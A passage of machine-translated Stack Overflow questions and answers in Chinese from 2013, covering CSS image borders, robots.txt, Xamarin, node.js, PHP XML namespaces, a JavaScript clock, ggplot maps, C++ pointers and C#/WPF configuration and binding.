您可以将样式添加到特定的图像标签，这相当于使用 HTML 属性进行样式设置：

```
<img src="..." style="border:5px solid green" /> 
```

您可以在样式表中制定规则，并将类添加到图像标签以使用它：

CSS：

```
.Picture { border: 5px solid green; } 
```

HTML：

```
<img src="..." class="Picture" /> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-15T11:05:35.917

您可以因为它已经指向您，只需向图像添加一个类，但在某些情况下您无法更改除 css 之外的内容和/或者您可能在大多数情况下都感觉像我一样不必要地浪费时间为您使用的所有图像添加类。使用正确的选择器可能会更好。如果有一个类的父元素，则使用该类。下面是一个示例：

**HTML**

```
<div class="content">
<img/>
</div> 
```

**CSS**

```
div.content > img{
border:1px solid;
} 
```

这是做事的最佳方式，因为它不会向您的内容添加额外的内容，这反过来又会加快加载速度和用户体验。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-15T11:06:29.263

## 类选择器

使用元素中的 class 属性将元素分配给命名类。为班级选择什么名称取决于您。文档中的多个元素可以具有相同的类值。

在您的样式表中，当您在选择器中使用类名时，在类名之前键入一个句号（句点）。

（例如，请参阅 RichieHindle 的答案）

* * *

## ID 选择器

使用元素中的 id 属性为元素分配 ID。由您为 ID 选择什么名称。ID 名称在文档中必须是唯一的。

在您的样式表中，当您在选择器中使用 ID 时，在 ID 之前键入一个数字符号（哈希）。

```
<div id="myStyledDiv">

#myStyledDiv{
   border: 1px solid black;
} 
```

来源：[Webplatfroms.org](http://docs.webplatform.org/wiki/tutorials/using_selectors)（我建议你阅读所有这篇文章）

# seo - 我应该在 robots.txt 文件的末尾添加一条允许所有语句吗？

> ID：16013425
> 
> 赞同：1
> 
> 时间：2013-04-15T10:56:53.547
> 
> 标签：seo, web-crawler, robots.txt, google-search-console

我是否需要在 robots.txt 中的 disallow 语句之后添加一条 allow all 语句，或者机器人是否假定他们可以抓取任何未标记为不允许的内容。

例子：

```
User-Agent: *

Disallow: /folder1/
Disallow: /folder2/
Disallow: /folder3/
Disallow: /file1.php
Disallow: /file2.php

Allow: /

Sitemap: http://www.example.co.uk/sitemap.xml 
```

或者

```
User-Agent: *

Disallow: /folder1/
Disallow: /folder2/
Disallow: /folder3/
Disallow: /file1.php
Disallow: /file2.php

Sitemap: http://www.example.co.uk/sitemap.xml 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T11:11:42.447

如果您的意图是允许蜘蛛查找除明确禁止的项目之外的所有内容，则无需明确允许。

不允许规则用于蜘蛛确定是否不应该索引它找到的东西 - 如果这些规则中没有匹配蜘蛛当前正在查看的地址，它就会被索引。

[这](http://www.javascriptkit.com/howto/robots.shtml)是一个相当简单的示例页面。

# android - 更新 Xamarin Studio 后的警告

> ID：16013434
> 
> 赞同：6
> 
> 时间：2013-04-15T10:57:10.897
> 
> 标签：android, xamarin.android, xamarin-studio, publickeytoken

我刚刚将 Xamarin Studio 更新到最新版本（Xamarin.Android 版本：4.6.4（商业版）），更新后我收到很多警告......：

> /Library/Frameworks/Mono.framework/External/xbuild/Xamarin/Android/Xamarin.Android.Common.targets：警告：参考'mscorlib，版本= 2.0.5.0，Culture=neutral，PublicKeyToken=xxxxx'未解决（TrackandTrace.机器人）
> 
> /Library/Frameworks/Mono.framework/External/xbuild/Xamarin/Android/Xamarin.Android.Common.targets：警告：参考'Mono.Android，版本= 0.0.0.0，文化=中性，PublicKeyToken=xxxx'未解决（ TrackandTrace.Droid)

我已经尝试删除引用并重新添加它而没有任何效果。

**更新：** 即使我创建了一个新项目，我从一开始就收到 2 个错误。这些错误导致无法构建 android 项目。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-23T16:15:43.913

我也经历过升级后（我相信你在发布模式下尝试过）尝试在你的应用程序属性中更改你的适当架构（如果不确定，请选择所有 3 个）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T14:16:51.797

尝试以下（只是猜测）：

找到以下路径： `C:\Program Files\Reference Assemblies\Microsoft\Framework\.NETPortable\v4.0\Profile\Profile104\SupportedFrameworks`

在该目录中添加一个具有该名称的新 xml 文件：“ `MonoAndroid, Version=v1.6+.xml`”。以及以下内容：

```
<?xml version="1.0" encoding="utf-8"?>
<Framework DisplayName="Mono for Android"
  Identifier="MonoAndroid"
  Profile="*"
  MinimumVersion="1.6"
  MaximumVersion="*" /> 
```

重新启动 Visual Studio 并重试。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-24T15:50:20.853

几周前我尝试更新时遇到了类似的问题。我从支持/错误修复团队获得了一些有用的建议：

在 Xamarin Studio 中，单击帮助--> 检查更新。将更新通道从 Stable 更改为 Alpha（或 Beta）并尝试该版本。如果这不起作用，您可以通过以下方式回滚到以前的版本：

[http://store.xamarin.com/account/Products](http://store.xamarin.com/account/Products)并单击右下角的显示最近的版本。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-01-24T15:25:38.053

将 Microsoft.AspNetCore.SignalR.Client.Core NuGet 包添加到您的核心项目中，这应该可以解决问题。

有关详细信息，请参阅[更新到 Visual Studio 2017 版本 15.8 预览版后的“无法解析引用：`System.Memory`”或“找不到 `System.Memory`”](https://stackoverflow.com/questions/51296773/can-not-resolve-reference-system-memory-or-could-not-find-system-memory)。

# node.js - node.js 中超出了最大调用堆栈大小

> ID：16013436
> 
> 赞同：2
> 
> 时间：2013-04-15T10:57:19.847
> 
> 标签：node.js

这是我的带有 mongodb 的 node.js 应用程序，代码自爆运行良好，只需通过用户会话 id 从 mongodb 数据库加载用户信息，会话存储是来自[connect-mongo](https://github.com/kcbanner/connect-mongo)的 MongoStore 。最初，这个 node.js 部署在我的计算机本地。

但是，当我单击浏览器以非常快地刷新页面时，在单击（20,30 次单击）后会抛出异常，说 **未捕获的异常： RangeError：超出最大调用堆栈大小** ，有时，它还会显示另一个错误，说错误：connect-mongo 上没有打开的连接

```
app.get('/',homePage);

function homePage(req,res){
    var locals = {};    

    userModel.findUserById(req.session.uid,function(err,user){
                    if(err) {
                        console.log('user uid not found'.red);
                    }
                    else{
                        console.log('find user uid'.green,user._id);
                        locals.user = {
                           username: user.username,
                           email: user.email
                        };
                        res.send(200);
                    }
    })  
} 
```

这是userModel调用的findUserById，它在另一个文件中。

```
function findUserById(id,callback){
        var id;
        try {
             id = mongoose.Types.ObjectId(id);
        } catch(e) {
                callback(err, null);
        }

        UserModel.findById(id,function(err, doc){
            if(err){callback(err, null);}
            else{
                callback(null, doc);
            }
        })  
    } 
```

我不知道真正出了什么问题，是connect-mongo还是其他什么，我发现超出最大调用堆栈大小的错误是因为递归，但是我在这里显示的代码没有递归。

> **更新：**

```
app.get('/',homePage);

function homePage(req,res){
    var locals = {};    
    res.send(200);
} 
```

即使在这种情况下，多次快速点击后，服务器也会抛出**Maximum call stack size exceeded的错误**

我猜是因为我的 node.js 版本和 express 不够兼容？我的 express 版本是 3.1.0 但我的 node.js 版本是 0.8.20？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:25:50.507

现在我将 node.js 版本更新到最新版本 10.4，问题似乎不再发生，所以可能是因为旧的 node.js 版本无法与最新的 express 版本一起使用。

我总是更新库版本，但不更新 node.js。

# php - 使用命名空间访问 php simplexml

> ID：16013443
> 
> 赞同：0
> 
> 时间：2013-04-15T10:57:49.547
> 
> 标签：php, xml, simplexml

-

大家好，

我正在尝试访问 XML 文件中的数据：

```
<OAI-PMH xmlns="http://www.openarchives.org/OAI/2.0/"         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:dc="http://dublincore.org/documents/dcmi-    namespace/" xsi:schemaLocation="http://www.openarchives.org/OAI/2.0/     http://www.openarchives.org/OAI/2.0/OAI-PMH.xsd";>
 <responseDate>2013-04-15T12:14:31Z</responseDate>
 <ListRecords>
 <record>
 <header>
 <identifier>
 a1b31ab2-9efe-11df-9922-efbb156aa6c1:01442b82-59a4-627e-800f-c63de74fc109
 </identifier>
 <datestamp>2012-08-16T14:42:52Z</datestamp>
 </header>
 <metadata>
 <oai_dc:dc xmlns:oai_dc="http://www.openarchives.org/OAI/2.0/oai_dc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.openarchives.org/OAI/2.0/oai_dc/ http://www.openarchives.org/OAI/2.0/oai_dc.xsd";>
 <dc:description>...</dc:description>
 <dc:date>1921</dc:date>
 <dc:identifier>K11510</dc:identifier>
 <dc:source>Waterschap Vallei & Eem</dc:source>
 <dc:source>...</dc:source>
 <dc:source>610</dc:source>
 <dc:coverage>Bunschoten</dc:coverage>
 <dc:coverage>Veendijk</dc:coverage>
 <dc:coverage>Spakenburg</dc:coverage>
 </oai_dc:dc>
 </metadata>
 <about>...</about>
 </record> 
```

这是 XML 的一个示例。

我需要访问 dc:date dc:source 等数据。

有人有什么想法吗？

最好的问候，蒂姆

- 更新 -

我现在正在尝试这个：

```
foreach( $xml->ListRecords as $records )
{
foreach( $records AS $record )
{

    $data = $record->children( 'http://www.openarchives.org/OAI/2.0/oai_dc/' );

    $rows = $data->children( 'http://purl.org/dc/elements/1.1/' );

    echo $rows->date;

    break;
}

break;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T11:25:43.343

您拥有位于不同 XML 名称空间中的嵌套元素。具体来说，您还涉及两个额外的命名空间：

```
$nsUriOaiDc = 'http://www.openarchives.org/OAI/2.0/oai_dc/';
$nsUriDc    = 'http://purl.org/dc/elements/1.1/'; 
```

第一个用于*`<oai_dc:dc>`*包含第二个 * `<dc:*>`* 元素之类的元素*`<dc:description>`*，依此类推。这些是您正在寻找的元素。

在您的代码中，您已经很好地了解了它是如何工作的：

```
$data = $record->children( 'http://www.openarchives.org/OAI/2.0/oai_dc/' );

$rows = $data->children( 'http://purl.org/dc/elements/1.1/' ); 
```

但是有一个*小*错误：`$data`孩子不是 的孩子，`$record`而是 的孩子`$record->metadata`。

您也不需要将两个*`foreach`*相互嵌套。代码示例：

```
$nsUriOaiDc = 'http://www.openarchives.org/OAI/2.0/oai_dc/';

$nsUriDc    = 'http://purl.org/dc/elements/1.1/';

$records = $xml->ListRecords->record;

foreach ($records as $record)
{    
    $data = $record->metadata->children($nsUriOaiDc);

    $rows = $data->children($nsUriDc);

    echo $rows->date;

    break;
}

/** output: 1921 **/ 
```

如果您遇到此类问题，您可以使用`$record->asXML('php://output');`来显示您当前正在遍历的元素。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T11:01:53.727

我想[这](http://www.sitepoint.com/simplexml-and-namespaces/)就是你要找的。希望能帮助到你 ;）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T11:23:56.303

使用 DomDocument 进行类似访问`dc:date`

```
 $STR='
<OAI-PMH xmlns="http://www.openarchives.org/OAI/2.0/"         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:dc="http://dublincore.org/documents/dcmi-    namespace/" xsi:schemaLocation="http://www.openarchives.org/OAI/2.0/     http://www.openarchives.org/OAI/2.0/OAI-PMH.xsd";>
 <responseDate>2013-04-15T12:14:31Z</responseDate>
 <ListRecords>
 <record>
 <header> <identifier> a1b31ab2-9efe-11df-9922-efbb156aa6c1:01442b82-59a4-627e-800f-c63de74fc109 </identifier>
<datestamp>2012-08-16T14:42:52Z</datestamp>
</header>
<metadata>
 <oai_dc:dc xmlns:oai_dc="http://www.openarchives.org/OAI/2.0/oai_dc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.openarchives.org/OAI/2.0/oai_dc/ http://www.openarchives.org/OAI/2.0/oai_dc.xsd";>
  <dc:description>...</dc:description>
  <dc:date>1921</dc:date>
  <dc:identifier>K11510</dc:identifier>
  <dc:source>Waterschap Vallei & Eem</dc:source>
  <dc:source>...</dc:source>
  <dc:source>610</dc:source>
  <dc:coverage>Bunschoten</dc:coverage>
  <dc:coverage>Veendijk</dc:coverage>
  <dc:coverage>Spakenburg</dc:coverage>
 </oai_dc:dc>
</metadata>
<about>...</about>
</record>';

  $dom= new DOMDocument; 
  $STR= str_replace("&", "&amp;", $STR);  // disguise &s going IN to loadXML() 
  // $dom->substituteEntities = true;  // collapse &s going OUT to transformToXML() 
  $dom->recover = TRUE;
  @$dom->loadHTML('<?xml encoding="UTF-8">' .$STR); 
  // dirty fix
  foreach ($dom->childNodes as $item)
  if ($item->nodeType == XML_PI_NODE)
      $dom->removeChild($item); // remove hack
  $dom->encoding = 'UTF-8'; // insert proper

  print_r($doc->getElementsByTagName('dc')->item(0)->getElementsByTagName('date')->item(0)->textContent); 
```

输出：

```
 1921 
```

或访问`dc:source`

```
 $source= $doc->getElementsByTagName('dc')->item(0)->getElementsByTagName('source');
 foreach($source as $value){
     echo $value->textContent."\n";
 } 
```

输出：

```
Waterschap Vallei & Eem
...
610 
```

或者给你数组

```
 $array=array();
 $source= $doc->getElementsByTagName('dc')->item(0)->getElementsByTagName("*");
 foreach($source as $value){

     $array[$value->localName][]=$value->textContent."\n";

 } 
 print_r($array); 
```

输出：

```
 Array
(
   [description] => Array
    (
        [0] => ...

    )

   [date] => Array
    (
        [0] => 1921

    )

   [identifier] => Array
    (
        [0] => K11510

    )

   [source] => Array
    (
        [0] => Waterschap Vallei & Eem

        [1] => ...

        [2] => 610

    )

   [coverage] => Array
    (
        [0] => Bunschoten

        [1] => Veendijk

        [2] => Spakenburg

    )

) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-08-29T13:32:39.560

使用 XPath 可以更直接地处理命名空间：

```
<?php

// load the XML into a DOM document
$doc = new DOMDocument;
$doc->load('oai-response.xml'); // or use $doc->loadXML($xml) for an XML string

// bind the DOM document to an XPath object
$xpath = new DOMXPath($doc);

// map all the XML namespaces to prefixes, for use in XPath queries
$xpath->registerNamespace('oai', 'http://www.openarchives.org/OAI/2.0/');
$xpath->registerNamespace('oai_dc', 'http://www.openarchives.org/OAI/2.0/oai_dc/');
$xpath->registerNamespace('dc', 'http://purl.org/dc/elements/1.1/');

// identify each record using an XPath query
// collect data as either strings or arrays of strings
foreach ($xpath->query('oai:ListRecords/oai:record/oai:metadata/oai_dc:dc') as $item) {
    $data = array(
        'date' => $xpath->evaluate('string(dc:date)', $item), // $item is the context for this query
        'source' => array(),
    );

    foreach ($xpath->query('dc:source', $item) as $source) {
        $data['source'][] = $source->textContent;
    }

    print_r($data);
} 
```

# javascript - 让时钟运行

> ID：16013444
> 
> 赞同：0
> 
> 时间：2013-04-15T10:57:53.457
> 
> 标签：javascript, refresh, clock

我希望时间每秒钟都重置一次，这样时钟就可以运行了。我是一个 javascript 菜鸟，我在任何地方都找不到任何解决方案。

```
 <!--
        var currentDate = new Date()
        var day = currentDate.getDate()
        var month = currentDate.getMonth() + 1
        var year = currentDate.getFullYear()
        document.write("<b>" + day + "/" + month + "/" + year + "</b>")
        //-->
    <!--
var currentTime = new Date()
var hours = currentTime.getHours()
var minutes = currentTime.getMinutes()
var seconds = currentTime.getSeconds()

if (minutes < 10)
minutes = "0" + minutes

if (seconds < 10)
seconds = "0" + seconds

document.write(hours + ":" + minutes + ":" + seconds) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:01:36.390

```
var myInterval = window.setInterval(function() {
  window.document.write(hours + ":" + minutes + ":" + seconds);
}, 1000); 
```

以后你可以用

```
window.clearInterval(myInterval); 
```

我们将 setInterval 的返回值（一个数字形式的 ID）分配给一个变量，因为稍后我们将需要它来使用 clearInterval 函数停止我们的特定间隔。如果我们不这样做，就没有办法（没有某些技巧）来停止间隔。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T10:59:35.507

为此，您需要使用该`window.setInterval`方法。请查看此页面以获取更多信息：[http ://www.w3schools.com/js/js_timing.asp](http://www.w3schools.com/js/js_timing.asp)

# r - ggplot 地图的奇怪内存问题

> ID：16013445
> 
> 赞同：4
> 
> 时间：2013-04-15T10:57:58.503
> 
> 标签：r, memory, ggplot2, gis, shapefile

我正在尝试制作一些不列颠群岛的地图，但遇到了一个非常奇怪的记忆问题。我的工作流程是利用 ggplot 的图层在底图上添加新的细节。

底图本身从[GADM](http://www.gadm.org/)获取英国和爱尔兰的形状文件，简化了`thinnedSpatialPoly`MapTools 中使用的几何图形，从而产生了这张地图：

![在此处输入图像描述](https://i.stack.imgur.com/wKSAR.png)

然后对于后续图层，我做同样的事情：加载 SHP 文件，简化几何并将其添加到基础地图，如下所示：

```
# new_data is a SpatialPolygonsDataFrame
base_map + geom(data=new_data, color="black", fill=my_fill) 
```

![在此处输入图像描述](https://i.stack.imgur.com/pVWZZ.png)

对于大多数地图，我都做得很好。但是，当我尝试添加一个特定层时，R 冻结并最终给我以下错误：

```
Error: cannot allocate vector of size 86.9 Mb
In addition: Warning messages:
1: In data.frame(x = x, y = y, aes_df) :
  Reached total allocation of 3953Mb: see help(memory.size)
2: In data.frame(x = x, y = y, aes_df) :
  Reached total allocation of 3953Mb: see help(memory.size)
3: In as.data.frame.numeric(x[[i]], optional = TRUE) :
  Reached total allocation of 3953Mb: see help(memory.size)
4: In as.data.frame.numeric(x[[i]], optional = TRUE) :
  Reached total allocation of 3953Mb: see help(memory.size)
5: In as.data.frame.numeric(x[[i]], optional = TRUE) :
  Reached total allocation of 3953Mb: see help(memory.size)
6: In as.data.frame.numeric(x[[i]], optional = TRUE) :
  Reached total allocation of 3953Mb: see help(memory.size) 
```

生成此图的代码与上面完全相同。如果我自己绘制新图层，例如

```
ggplot(new_data, aes(x=long, y=lat, group=group)) + geom_polygon 
```

那么就没有问题了，地图绘制得非常快。对于磁盘上的参考，形状文件为 769 KB，而其他层为 248 KB。

我不知道如何调试和解决这个问题。任何指针都会很棒 - 谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T11:28:07.110

我应该猜到了....问题出在底图和新图层上的投影不同。新层使用了 Traverse Mercator 投影，如果我记得包含与`coord_map`基础层相同的投影，它本身会导致内存问题。

您可以通过下载这些 shapefile（我使用[UKBORDERS](http://edina.ac.uk/census/)，但您也可以从[CDU](http://cdu.mimas.ac.uk/2011/data/boundary-data/index.html)获取它们，它再次使用不同的投影）重新创建问题，然后执行以下操作：

```
ggplot(new_data, aes(x=long, y=lat, group=group)) + geom_polygon() +
         coord_map(proj="azequalarea") 
```

要修复它，请将原始 shapefile 加载到 QGis 中，选择`Settings > Project Properties...`并选择`WGS 84`投影，应用并保存。新的 shapefile 工作得很好，给了我这个可爱的结果：

![在此处输入图像描述](https://i.stack.imgur.com/GN2Vy.png)

# c++ - 取消引用指向数组的指针？

> ID：16013450
> 
> 赞同：8
> 
> 时间：2013-04-15T10:58:04.013
> 
> 标签：c++, arrays, pointers

参考带有注释的行：

*   为什么在示例中添加括号可以打印数组的所有内容？

该示例打印“一”，然后打印垃圾。

```
#include <iostream>

int main() {
    const char* a[3] = { "one", "two", "three" };
    const char*(*p)[3] = &a;
    for(int i = 0; i < 3; i++) {
        std::cout << *p[i] << std::endl; // this line
    }
    return 0;
} 
```

更改为以下内容后它可以工作：

```
std::cout << (*p)[i] << std::endl; 
```

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2013-04-15T11:03:23.630

`p`是一个指向 3 个元素的数组的指针，如下所示：

```
┌─────┬─────┬─────┐
│     │     │     │
└─────┴─────┴─────┘
   ^
   └─ p 
```

请注意，它指向整个数组，而不是其中的单个元素。

该表达式`*p[i]`被视为`*(p[i])`由于运算符优先级（相当于`*(*(p + i))`）。这意味着您正在索引指向数组的指针。例如，如果您这样做`p[1]`，您将指针移动到“下一个”数组并尝试取消引用它：

```
┌─────┬─────┬─────┐
│     │     │     │
└─────┴─────┴─────┘
                     ^
                     └─ p + 1 
```

正如我们所看到的，那里什么都没有，你会得到未定义的行为。但是，当您这样做`(*p)[i]`（相当于`*((*p) + i)`）时，您要确保首先发生取消引用。取消引用为我们提供了数组本身，然后可以通过数组到指针的转换将其隐式转换为指向数组第一个元素的指针。所以你得到的是：

```
┌─────┬─────┬─────┐
│     │     │     │
└─────┴─────┴─────┘
   ^
   └─ *p 
```

在这种情况下，指针指向数组*元素*而不是整个数组。如果你然后索引，例如`(*p)[1]`，你会得到：

```
┌─────┬─────┬─────┐
│     │     │     │
└─────┴─────┴─────┘
         ^
         └─ (*p) + 1 
```

这为您提供了一个有效的`const char*`，然后可以由`cout`.

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-04-15T11:00:15.810

[运算符优先级。](http://en.cppreference.com/w/c/language/operator_precedence)如果没有`()`运算符`[]`，将首先调用它的结果`dereferenced`。使用`()`- 首先将是`dereference`然后调用操作员`[]`。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-15T11:00:15.353

[运算符优先级](http://en.cppreference.com/w/c/language/operator_precedence)。

数组选择的优先级高于取消引用，因此从编译器的角度来看，它实际上是：

```
*(p[i]) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-09-12T17:42:08.190

```
 #include <iostream>
        using namespace std;       

        int main() {

            int arr[5] = {1,2,3,4,5};

            int *p=arr;

            int intgerSize=sizeof(int);

            for(int k=0;k<5;k++)

            {  
                cout<<"arr ["<<k<<"] "<<*(p+(k*sizeof(int)/intgerSize));  
                cout<<"  "<<(p+(k*sizeof(int)/intgerSize));
                cout<<"  "<<p+k<<"\n"; 

            }`enter code here`

            return 0;
        }
OUTPUT:- 
arr [0] 1 0x7ffd180f5800  0x7ffd180f5800
arr [1] 2 0x7ffd180f5804  0x7ffd180f5804
arr [2] 3 0x7ffd180f5808  0x7ffd180f5808
arr [3] 4 0x7ffd180f580c  0x7ffd180f580c
arr [4] 5 0x7ffd180f5810  0x7ffd180f5810 
```

# ruby-on-rails - ruby 中的多表继承是否有任何值得信赖的宝石？

> ID：16013451
> 
> 赞同：1
> 
> 时间：2013-04-15T10:58:04.943
> 
> 标签：ruby-on-rails, ruby, rubygems, gem

我已经在互联网上搜索过，但找不到对多表继承很好的宝石。我只是想知道现在有人知道吗？

# python - 重复数据，如何解析以便于访问？

> ID：16013456
> 
> 赞同：0
> 
> 时间：2013-04-15T10:58:18.557
> 
> 标签：python, dictionary, struct

我收到大量数据，数百到数千行。格式一样，大概50行数据，然后同类型的数据重复。我知道数据代表什么，但收到的数据不包含这个。

所以收到的数据将如下所示：

```
 Value(int):       703                                                    
     Value(int):       12                                                     
     Value(int):       58                                                     
     Value(int):       0                                                      
     Value(int):       -1                                                     
     Value(int):       88                                                     
  Value(string):       272                                                    
  Value(string):       01                                                     
     Value(int):       61                                                     
     Value(int):       0                                                      
     Value(int):       0 
```

但我知道每件事的含义，例如：

```
fcn:Integer
Range: 0 to 16383
Code:Integer
Range: 0 to 511
CountryCode:String
^\d{3}$
NetworkCode:String 
```

所以这些重复，什么是解析这些数据的简单方法，以便我可以查看每个重复系列的第一个元素等等来比较它们？我可以做一个结构吗？我需要字典吗，或者我该怎么做？我不确定这些问题是否被允许，基本上想知道你会怎么做以及为什么。

这是一轮重复数据，我坚持每个值的每个名称是什么。所以我会在哪里收到`Value(int): 1`我知道它是`Band Name`：

```
Band Name: 
     Value(int):     1
Cell Scan Time
  Value(string):     2013-04-03T08:21:10Z
       Sequence: 
       Sequence: 
ARFCN/UARFCN --->2112.8 MHz DL / 1922.8 MHz UL
     Value(int):       10564
RSSI
     Value(int):       39
BSIC/SCODE
     Value(int):       263
RXQUAL
     Value(int):       0
FREQ OFFSET
     Value(int):       9
FREQ QUAL
     Value(int):       90
MCC
  Value(string):       272
MNC
  Value(string):       05
LAC
     Value(int):       67
RAC
     Value(int):       67
RNC Identity
     Value(int):       708
Cell ID
     Value(int):       130
CPICH TX POWER
     Value(int):       31
Patch Loss
     Value(int):       102
CPICH EC over N0
     Value(int):       -5
CPICH RSCP
     Value(int):       -76
RXLEV + CPICH EC
     Value(int):       0
TX Diversity

QQUAL MIN
     Value(int):       -20
QRXLEV MIN
     Value(int):       -111
HCS Priority
     Value(int):       -1
DeltaQHcsRscp
     Value(int):       -1
Scan Temperature 
     Value(int):       0 
```

以下内容仅在每收到几组数据时重复一次，其余的始终以相同的格式重复：

```
Band Name: 
     Value(int):     1
Cell Scan Time
  Value(string):     2013-04-03T08:21:10Z
       Sequence: 
       Sequence: 
```

完整的输出示例： http: [//pastebin.com/ArGfm2cD](http://pastebin.com/ArGfm2cD)

编辑：

我的数据当前存储在一个变量中：

```
proc = subprocess.Popen(cmd_rancli, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
proc_stdout  = proc.communicate(ran_opt_get_access_data)[0]
print proc_stdout 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:43:26.417

首先，要更好地理解问题：如何与数据流同步？我得到的是你一个接一个地得到这个值，你必须把它们放在一个以某种方式实现的结构中。如果您有连续流或文本文件，则需要以不同方式执行此操作。无论如何，假设你得到一个流并且你知道第一个值是 X，第二个 Y 等等，你可以：

1）创建一个包含所有需要字段的字典或一个类。

2）获取您收到的字段并检查类型（如果您期望一个int，您可以检查“int”是否在您收到的字符串中）

3）进行转换并管理可能的异常（如果你找到“int”但你发现“gatto”有一个错误

4）将您提取的值（如果该行是“Value（int）：10”，您可以`int(line.split(":")[1]))`在数据结构中的正确位置进行操作，依此类推。

如果您收到一个序列，您还应该检查类型一致性，“如果在第三个位置我等待一个字符串，如果我得到一个 int 会发生什么？”

是否清楚或者您需要更多解释/示例？

# c# - 每个环境使用不同的配置

> ID：16013460
> 
> 赞同：0
> 
> 时间：2013-04-15T10:58:36.637
> 
> 标签：c#, web-config

我的配置看起来像这样，我不知道如何阅读，如果我选择产品或预览，我想获得价值？

```
<configuration> 

  <environment name="product">
     <connectionString> connection string</connectionString>
     <logPath>C:\*****</logPath>
     <errorLogPath>C:\*****</errorLogPath>
     <ProcessesNumber>5</ProcessesNumber>
      <sendAtOnce>100</sendAtOnce>
     <restInterval>30000</restInterval>
     <stopTime>30000</stopTime>
 </environment>

 <environment name="preview">
    <connectionString> connctionstring </connectionString>
    <logPath>C:\*****</logPath>
    <errorLogPath>C:\*****</errorLogPath>
    <ProcessesNumber>5</ProcessesNumber>
    <sendAtOnce>100</sendAtOnce>
    <restInterval>30000</restInterval>
   <stopTime>30000</stopTime>
 </environment>

</configuration> 
```

如何在调试中阅读此内容？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:23:45.023

使用 LINQ 非常简单

这应该可以帮助你

```
class Configuration
{
    public string connectionString { get; set; }
    public string logPath { get; set; }
    public string errorLogPath { get; set; }
    public int ProcessesNumber { get; set; }
    public int sendAtOnce { get; set; }
    public int restInterval { get; set; }
    public int stopTime { get; set; }
}

static void Main(string[] args)
{
    try
    {
        XDocument doc = XDocument.Load("config.xml");
        string conftype = "product";

        var configuration = (from config in doc.Elements("configuration").Elements("environment")
                             where config.Attribute("name").Value.ToString() == conftype
                             select new Configuration
                             {
                                 connectionString = config.Element("connectionString").Value.ToString(),
                                 logPath = config.Element("logPath").Value.ToString(),
                                 errorLogPath = config.Element("errorLogPath").Value.ToString(),
                                 ProcessesNumber = int.Parse(config.Element("ProcessesNumber").Value.ToString()),
                                 sendAtOnce = int.Parse(config.Element("sendAtOnce").Value.ToString()),
                                 restInterval = int.Parse(config.Element("restInterval").Value.ToString()),
                                 stopTime = int.Parse(config.Element("stopTime").Value.ToString()),
                             }).First();
    }
    catch (Exception e)
    {
        Console.WriteLine(e.ToString());
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T11:01:09.843

在 C# 中，我建议您使用 Linq to XML。它在标准 .net 框架 (3.5) 中，它可以帮助您加载 XML，并轻松读取它的每个节点和属性。

# c# - 使用 WPF 将 Datagrid 第一列绑定到列表中

> ID：16013463
> 
> 赞同：0
> 
> 时间：2013-04-15T10:58:40.593
> 
> 标签：c#, .net, wpf, xaml

我有两列路径和文件名作为datagrid1，我想将路径列绑定到一个列表<>，这样我就可以通过单击一个按钮将所有文件复制到不同的位置。有人能帮助我吗？寻找 c# wpf 代码。

```
Path            FileName
C:\Temp\abc.txt abc.txt
C:\Temp\xyz.txt xyz.txt
C:\Temp\a.txt   a.txt 
```

# 编码

# XAML

```
<DataGrid AutoGenerateColumns="False" Height="193" HorizontalAlignment="Left"
          Margin="169,6,0,0" Name="dataGrid1" VerticalAlignment="Top" Width="200"              
          ItemsSource="{Binding}">
          <DataGrid.Columns>
              <DataGridTextColumn Header="Path" Binding="{Binding Path}" />
              <DataGridTextColumn Header="FileName" Binding="{Binding FileName}" />
          </DataGrid.Columns>
</DataGrid> 
```

# 在后面

```
public class ReportFiles
    {
        public string Path { get; set; }
        public string FileName { get; set; }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-16T12:00:51.660

我查看了你的代码，它看起来结构不太好，
而且它也不起作用，尤其是那个`"buttonAttach_Click()"`功能。

## 这里有不同的事情要提到。

1.  将 Class 重命名`ReportFiles`为`ReportFile`，因为它只描述“一个”文件，而不是一堆文件。

2.  的属性`ReportFiles`没有正确命名。
    `RealName`,`TargetName`不是真的不言自明，所以我将它们更改为`Path`,`FileName`

3.  您通过以下调用将项目作为匿名对象添加到 DataGrid：

    `dataGrid1.Items.Add(new { RealName = list.RealName, TargetName = list.TargetName});`

    如果您添加对象本身，以后使用它会更干净，更容易。
    特别是因为您已经在之前的行中创建了它。
    所以我把它改成：

    `ReportFile reportFile = new ReportFile();`
    `reportFile.Path = str;`
    `reportFile.FileName = System.IO.Path.GetFileName(str);`
    `dataGrid1.Items.Add(reportFile);`

